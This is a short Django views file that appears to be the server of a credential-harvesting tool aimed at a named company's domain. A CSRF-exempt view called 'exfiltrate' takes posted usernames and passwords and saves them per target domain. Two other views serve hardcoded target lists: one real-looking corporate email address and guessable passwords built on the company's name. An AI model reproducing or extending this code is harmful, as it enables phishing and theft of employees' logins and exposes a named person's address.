import json

from django.http import HttpResponse
from django.template import loader
from django.views.decorators.csrf import csrf_exempt

from app.models import Credential, Domain


def index(request, domain):
    find = Domain.objects.get(name=domain)
    template = loader.get_template('app/index.html')
    context = {
        'domain': find
    }
    return HttpResponse(template.render(context, request))


@csrf_exempt
def exfiltrate(request, domain):
    find = Domain.objects.get(name=domain)
    cred_json = json.loads(request.body)
    cred = Credential(username=cred_json['username'], password=cred_json['password'], domain=find)
    cred.save()
    return HttpResponse(status=204)


def usernames(request, domain):
    return HttpResponse('emmanuel.lacourarie-ext@mousquetaires.com\n')


def passwords(request, domain):
    return HttpResponse('test\nMousquetaires1\ncoucou\n')
